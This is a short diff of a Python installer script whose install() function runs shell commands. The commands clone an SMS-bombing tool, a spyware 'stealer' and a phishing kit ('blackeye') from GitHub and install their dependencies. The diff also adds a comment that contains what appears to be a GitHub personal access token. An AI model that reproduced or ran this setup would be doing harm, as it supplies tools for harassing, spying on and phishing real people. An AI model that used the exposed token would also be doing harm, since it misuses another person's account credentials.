@@ -3,12 +3,12 @@ import subprocess
 import time
 import sys
 from colorama import Fore, Back
-
+#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
 
 def install():
     clear_term()
     aptupdate = subprocess.run('apt upgrade&&apt update&&pkg install git', shell = True)
-    bomber = subprocess.run('git clone https://github.com/TheSpeedX/TBomb', shell = True)
+    bomber = subprocess.run('git clone https://github.com/TheSpeedX/TBomb&&pip install requests', shell = True)
     stealer = subprocess.run('git clone https://github.com/tiagorlampert/sAINT.git', shell = True)
     stealer2 = subprocess.run('sudo apt install maven&&sudo --fix-broken install&&sudo apt install zlib1g-dev libncurses5-dev lib32z1 lib32ncurses6 -y', shell = True)
     phish = subprocess.run('git clone https://github.com/An0nUD4Y/blackeye', shell= True)
